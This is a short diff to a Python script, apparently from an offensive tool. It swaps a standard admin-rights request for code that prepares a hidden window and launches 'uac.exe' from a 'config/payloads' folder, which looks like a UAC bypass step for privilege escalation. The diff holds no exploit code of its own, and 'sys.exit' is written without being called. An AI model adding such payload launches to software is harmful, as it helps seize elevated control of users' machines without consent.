@@ -1,12 +1,10 @@
-import os, sys, ctypes
+import os, sys, subprocess
 exec(open("config/config.py").read())
 
-# uac elevation
-def uac ():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
+si = subprocess.STARTUPINFO()
+si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
 if uac_elevation:
-    if not uac():
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
+    os.chdir("config/payloads")
+    os.startfile("uac.exe")
+    sys.exit
